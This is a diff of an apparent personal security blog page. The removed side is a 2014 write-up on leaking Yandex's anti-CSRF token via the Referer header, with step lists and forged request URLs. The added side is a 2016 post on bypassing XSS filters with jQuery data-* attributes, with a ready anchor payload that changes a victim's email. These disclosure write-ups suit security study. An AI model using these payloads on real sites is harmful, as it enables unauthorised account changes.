@@ -6,22 +6,22 @@
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <meta name="viewport" content="width=device-width, initial-scale=1">
   
-  <title>Bypass anti CSRF token of Yandex!</title>
-  <meta name="description" content="When you browse a link in docviewer.yandex.com, The site will recreate a token named `sk`, which is used to validate a redirection and anti-csrf token `sk` i...">
+  <title>Scriptless attack—Use Unobtrusive scripting in malicious way(Bypassing XSS Mitigations Via Script Gadgets)</title>
+  <meta name="description" content="Stored on-site request forgery">
 
   <!-- CSS files -->
-  <link rel="stylesheet" href="/css/font-awesome.min.css">
-  <link rel="stylesheet" href="/css/main.css">
-  <link rel="stylesheet" href="/css/responsivediv.css">
+  <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+  <link rel="stylesheet" href="http://192.168.33.177:4000//css/main.css">
+  <link rel="stylesheet" href="http://192.168.33.177:4000//css/responsivediv.css">
 
-  <link rel="canonical" href="/articles/2014-05/leaking-anti-CSRF-token-of-yandex!">
-  <link rel="alternate" type="application/rss+xml" title="Blog BLog" href=" /feed.xml " />
+  <link rel="canonical" href="http://192.168.33.177:4000//articles/2016-07/Use-Unobtrusive-scripting">
+  <link rel="alternate" type="application/rss+xml" title="Blog BLog" href="http://192.168.33.177:4000/ /feed.xml " />
 
   <!-- Icons -->
   <!-- 16x16 -->
-  <link rel="shortcut icon" href="/favicon.ico">
+  <link rel="shortcut icon" href="http://192.168.33.177:4000//favicon.ico">
   <!-- 32x32 -->
-  <link rel="shortcut icon" href="/favicon.ico">
+  <link rel="shortcut icon" href="http://192.168.33.177:4000//favicon.ico">
 
 </head>
 
@@ -30,30 +30,30 @@
   <div class="row">
     <div class="col s12 m3">
       <div class="table cover">
-        
+         
 
 <div class="cover-card table-cell table-middle">
   
-  <img src="/img/profile.jpg" alt="this is me!" class="avatar">
+  <img src="http://192.168.33.177:4000//img/profile.jpg" alt="this is me!" class="avatar">
   
-  <a href="/" class="author_name">Adrian Belen</a>
+  <a href="http://192.168.33.177:4000//" class="author_name">Adrian Belen</a>
   <span class="author_job">WEB APPLICATION SECURITY ENTHUSIAST, BREAKING THINGS FOR FUN & profit :D</span>
   <span class="author_bio mbm"></span>
   <nav class="nav">
     <ul class="nav-list">
        
       <li class="nav-item">
-        <a href="/about me ">about me</a>
+        <a href="http://192.168.33.177:4000//about me ">about me</a>
         <span>/</span>
       </li>
       
       <li class="nav-item">
-        <a href="/archive">archive</a>
+        <a href="http://192.168.33.177:4000//archive">archive</a>
         <span>/</span>
       </li>
       
       <li class="nav-item">
-        <a href="/categories">categories</a>
+        <a href="http://192.168.33.177:4000//categories">categories</a>
       </li>
      
     </ul>
@@ -61,14 +61,14 @@
   <div class="social-links">
   <ul>
     
-    <li><a href="http://twitter.com/nukesec" class="social-link-item" target="_blank"><i class="fa fa-fw fa-twitter"></i></a></li>
+    <li><a href="http://twitter.com/nukesec" class="social-link-item" target="_blank"><i class="fab fa-twitter-square"></i></a></li>
     
     
     
     
     
     
-    <li><a href="http://github.com/deadstar1" class="social-link-item" target="_blank"><i class="fa fa-fw fa-github"></i></a></li>
+    <li><a href="http://github.com/deadstar1" class="social-link-item" target="_blank"><i class="fab fa-github"></i></a></li>
     
     
     
@@ -141,17 +141,17 @@
     <div class="col s12 m9">
       <div class="post-listing">
         <div class="back-home">
-  <a href="/">< back Home.</a>
+  <a href="http://192.168.33.177:4000//">< back Home.</a>
 </div>
 
 
 
 <div id="post">
   <header class="post-header">
-    <h1 title="Bypass anti CSRF token of Yandex!">Bypass anti CSRF token of Yandex!</h1>
+    <h1 title="Scriptless attack—Use Unobtrusive scripting in malicious way(Bypassing XSS Mitigations Via Script Gadgets)">Scriptless attack—Use Unobtrusive scripting in malicious way(Bypassing XSS Mitigations Via Script Gadgets)</h1>
     <span class="post-meta">
       <span class="post-date">
-        7 MAY 2014
+        25 JUL 2016
       </span>
       •
       <span class="read-time" title="Estimated read time">
@@ -166,48 +166,45 @@
   </header>
 
   <article class="post-content">
-    <p>When you browse a link in docviewer.yandex.com, The site will recreate a token named sk, which is used to validate a redirection and anti-csrf token. sk is also an anti-CSRF token on <code class="highlighter-rouge">http://webmaster.yandex.ru, https://docviewer.yandex.com/r.xml</code>. now If the attacker knows the value of your sk token, he can make a redirection and CSRF attack. How to know the token of the victim ???. Because <code class="highlighter-rouge">http://docviewer.yandex.com/r.xml?sk=thecsrftokenofvictim&amp;url=evilsite</code> useD GET request, the params are showed in URL and it also changeable to https to HTTP. as a result, you can use REFERER HEADER to get the token.</p>
+    <blockquote>
+  <p>13/06/2017: This attack was coined as <a href="https://www.youtube.com/watch?v=p07acPBi-qw">Bypassing XSS Mitigations Via Script Gadgets</a></p>
+</blockquote>
 
-<h3 id="hack-steps">HACK STEPS</h3>
-<ul>
-  <li>Upload a document with link or a hyperlink. that hyperlink is the attacker’s site..</li>
-  <li>Select the file, Share the link using the share button then get the link</li>
-  <li>Browse that link, Then click the view button you will redirect to docviewer.yandex.com</li>
-  <li>Change the https to http to allow us to see the referer in our site.</li>
-</ul>
+<p>Probably You have experienced a situation which your context based XSS payload,composed of javascript command; event handlers and HTML tags,  is removed by XSS filters but not the data-* attributes. The XSS filter only returns some HTML tag (<code>&lt;b&gt;</code>, <code>&lt;a&gt;</code> or <code>&lt;i&gt;</code> ) and tag’s data-* attributes.</p>
 
-<figure class="highlight"><pre><code class="language-text" data-lang="text"> 
-https://docviewer.yandex.com/?url=ya-disk-public://nhP6POxtEi4v9wDffRyOFHbGQgIOhlsEbLhl3zH9c7k%3D&amp;name=testxxx.odt to http://docviewer.yandex.com/?url=ya-disk-public://nhP6POxtEi4v9wDffRyOFHbGQgIOhlsEbLhl3zH9c7k%3D&amp;name=testxxx.odt</code></pre></figure>
+<h2 id="unobtrusive-scripting-support-for-jquery">Unobtrusive scripting support for jQuery</h2>
 
-<ul>
-  <li>Send the url to victim and induce him to click the link for attacker’site to able to leak the anti-CSRF token.</li>
-</ul>
+<p>Unobtrusive javascript is an approach of separating behavior from presentation or HTML. jQuery, a javascript framework, uses HTML 5 data-* attribute as a way of passing data into javascript.</p>
 
-<p>now you have his <code class="highlighter-rouge">sk</code> token! that is the bypass!</p>
+<p>Crafted context based XSS payload w/ data-* attribute could allow an attacker to call a limited javascript function. for instance, a <code>data-confirm</code> attribute executes a javascript confirm box.</p>
 
-<p><strong>for redirection</strong></p>
+<h3 id="abuse-predefined-data--attributes-of-jquery">Abuse predefined data-* attributes of Jquery</h3>
 
-<figure class="highlight"><pre><code class="language-text" data-lang="text"> 
- https://docviewer.yandex.com/r.xml?sk=thecsrftokenofvictim&amp;url=evilsite
- </code></pre></figure>
+<p>As I said before, javascript and event handlers of context based XSS payload are removed by an XSS filters but not data-* attributes. Lucky there are predefined data-* attributes that we could use.
+The XSS filters would be bypassed through the combination of data-method, data-params, data-URL and data-remote. These data attributes can send an HTTP Request including its CSRF token to the Origin (an on-site request forgery).</p>
 
-<p><strong>for csrf</strong> →</p>
+<p>Just like CSRF attack, The attack can force the user to perform state-changing requests like transferring funds, changing their email address, and so forth. But The HTTP request is coming from the same origin.</p>
 
-<figure class="highlight"><pre><code class="language-text" data-lang="text">http://webmaster.yandex.com/settings/messages/types.xml?email_1=EMAIL&amp;email_2=EMAIL&amp;message_3=MESSAGE&amp;email_3=EMAIL&amp;message_4=MESSAGE&amp;percent=50&amp;message_5=MESSAGE&amp;message_6=MESSAGE&amp;message_7=MESSAGE&amp;message_8=MESSAGE&amp;email_8=EMAIL&amp;message_9=MESSAGE&amp;message_10=MESSAGE&amp;message_12=MESSAGE&amp;message_17=MESSAGE&amp;message_18=MESSAGE&amp;message_19=MESSAGE&amp;email_19=EMAIL&amp;message_21=MESSAGE&amp;email_21=EMAIL&amp;message_22=MESSAGE&amp;email_22=EMAIL&amp;message_32=MESSAGE&amp;do=save&amp;sk=TOKENOFVICTIM</code></pre></figure>
+<p><strong>“data-url” and “data-remote”: Send AJAX request to the given url after change event on element</strong></p>
 
-<p><strong>This is wide CSRF attack which affect other Yandex domain.</strong></p>
+<p>```
+<input type="checkbox" name="task" id="task" value="1" data-url="/tasks/1" data-remote="true" data-method="post" /></p>
 
-<h3 id="list-of-affected-yandex-domain">list of affected Yandex domain</h3>
+<p>```</p>
 
-<ul>
-  <li>http://appmetrica.yandex.com/</li>
-  <li>https://calendar.yandex.ru</li>
-  <li>https://disk.yandex.com/</li>
-  <li>docviewer.yandex.com</li>
-  <li>m.contact.yandex.com.tr &amp; etc</li>
-</ul>
+<p><strong>“data-params”: Add additional parameters to the request</strong></p>
 
-<p><em>NOTE: i used javascript code to get the leaked csrf token on refrerer header and append it to my CSRF PoC.</em></p>
+<p><code>
+&lt;a data-remote="true" data-method="post" data-params="param1=Hello+server" href="/test"&gt;AJAX action with POST request&lt;/a&gt;
+</code></p>
+
+<p>I used <code>&lt;a&gt;</code> tag since XSS filters refuses  <code>&lt;input&gt;</code>,<code>&lt;form&gt;</code> HTML tag, My final payload would be this</p>
+
+<p><code>
+&lt;a data-remote="true" data-method="post" href="https://victim.com/change_email/" data-params="post_data_param_its_value"&gt;CSRF OF THE WIND&lt;/a&gt;
+</code></p>
+
+<p>When a victim clicks our injected <code>&lt;a&gt;</code> tag, the browser sends a POST HTTP request including the CSRF token that changes the email address of victim’s account.</p>
 
   </article>
 </div>
@@ -216,49 +213,34 @@ https://docviewer.yandex.com/?url=ya-disk-public://nhP6POxtEi4v9wDffRyOFHbGQgIOh
   <h6>Share on: </h6>
   <ul>
     <li>
-      <a href='https://twitter.com/intent/tweet?text=http://maradrianbelen.com/articles/2014-05/leaking-anti-CSRF-token-of-yandex! @nukesec' class="twitter btn" title="Share on Twitter"><i class="fa fa-twitter"></i><span> Twitter</span></a>
+      <a href='https://twitter.com/intent/tweet?text=http://maradrianbelen.com/articles/2016-07/Use-Unobtrusive-scripting @nukesec' class="twitter btn" title="Share on Twitter"><i class="fa fa-twitter"></i><span> Twitter</span></a>
     </li>
     <li>
-      <a href="https://www.facebook.com/sharer/sharer.php?u=http://maradrianbelen.com/articles/2014-05/leaking-anti-CSRF-token-of-yandex! @nukesec'" class="facebook btn" title="Share on Facebook"><i class="fa fa-facebook"></i><span> Facebook</span></a>
+      <a href="https://www.facebook.com/sharer/sharer.php?u=http://maradrianbelen.com/articles/2016-07/Use-Unobtrusive-scripting @nukesec'" class="facebook btn" title="Share on Facebook"><i class="fa fa-facebook"></i><span> Facebook</span></a>
     </li>
     <li>
-      <a href="https://plus.google.com/share?url=http://maradrianbelen.com/articles/2014-05/leaking-anti-CSRF-token-of-yandex!" class="google-plus btn" title="Share on Google Plus"><i class="fa fa-google-plus"></i><span> Google+</span></a>
+      <a href="https://plus.google.com/share?url=http://maradrianbelen.com/articles/2016-07/Use-Unobtrusive-scripting" class="google-plus btn" title="Share on Google Plus"><i class="fa fa-google-plus"></i><span> Google+</span></a>
     </li>
     <li>
-      <a href="https://news.ycombinator.com/submitlink?u=http://maradrianbelen.com/articles/2014-05/leaking-anti-CSRF-token-of-yandex!" class="hacker-news btn" title="Share on Hacker News"><i class="fa fa-hacker-news"></i><span> Hacker News</span></a>
+      <a href="https://news.ycombinator.com/submitlink?u=http://maradrianbelen.com/articles/2016-07/Use-Unobtrusive-scripting" class="hacker-news btn" title="Share on Hacker News"><i class="fa fa-hacker-news"></i><span> Hacker News</span></a>
     </li>
     <li>
-      <a href="https://www.reddit.com/submit?url=http://maradrianbelen.com/articles/2014-05/leaking-anti-CSRF-token-of-yandex!" class="reddit btn" title="Share on Reddit"><i class="fa fa-reddit"></i><span> Reddit</span></a>
+      <a href="https://www.reddit.com/submit?url=http://maradrianbelen.com/articles/2016-07/Use-Unobtrusive-scripting" class="reddit btn" title="Share on Reddit"><i class="fa fa-reddit"></i><span> Reddit</span></a>
     </li>
   </ul>
 </div><!-- end share-buttons -->
 
 
-<div id="disqus_thread"></div>
-<script type="text/javascript">
-    /* * * CONFIGURATION VARIABLES * * */
-    var disqus_shortname = 'adrianswebsecurityblog';
-
-    /* * * DON'T EDIT BELOW THIS LINE * * */
-    (function() {
-        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
-        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
-        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
-    })();
-</script>
-<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>
-
-
 
         <footer>
-  &copy; 2016 Adrian Belen. Powered by <a href="http://jekyllrb.com/">Jekyll</a>,  made with <i class="fa fa-heart heart-icon"></i>
+  &copy; 2019 Adrian Belen. Powered by <a href="http://jekyllrb.com/">Jekyll</a>,  made with <i class="fa fa-heart heart-icon"></i>
 </footer>
 
       </div>
     </div>
   </div>
-  <script type="text/javascript" src="/js/jquery-2.1.4.min.js"></script>
-<script type="text/javascript" src="/js/main.js"></script>
+  <script type="text/javascript" src="http://192.168.33.177:4000//js/jquery-2.1.4.min.js"></script>
+<script type="text/javascript" src="http://192.168.33.177:4000//js/main.js"></script>
 <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/anchor-js/3.1.1/anchor.min.js"></script>
 
 <!-- Asynchronous Google Analytics snippet -->
@@ -285,7 +267,7 @@ https://docviewer.yandex.com/?url=ya-disk-public://nhP6POxtEi4v9wDffRyOFHbGQgIOh
     var motos = [
     //"In the end, people will judege you anyway, so don't live your life impressing others - live your life impressing yourself",
     //"Live life to express, not to impress",
-    "<b>Success</b> is the ability to go from one failure to another with no loss of enthusiasm. </br> -Sir Winston Churchill"
+    "<b>Success</b> is the ability to go from one failure to another with no loss of enthusiasm."
     //"<b>IF</b> no mistake have you made, yet losing you are... a different game you should play </br> - Master Yoda"
     //"<b>No free quote for the day!</b>",
     //"Your dream doesn't have an expiration date. Take a deep breath, and try again.",
@@ -293,7 +275,7 @@ https://docviewer.yandex.com/?url=ya-disk-public://nhP6POxtEi4v9wDffRyOFHbGQgIOh
     ];
     var len =motos.length
     var x = Math.floor((Math.random() * len ) + 1);
-    document.getElementsByClassName('author_bio')[0].innerHTML='"'+motos[x-1] + '"';
+    document.getElementsByClassName('author_bio')[0].innerHTML='"'+motos[x-1] + '" </br> -Sir Winston Churchill';
     console.log('selected moto:' + motos[x-1]);
     console.log('moto count: ' + motos.length );
     console.log('random ' + x-1)
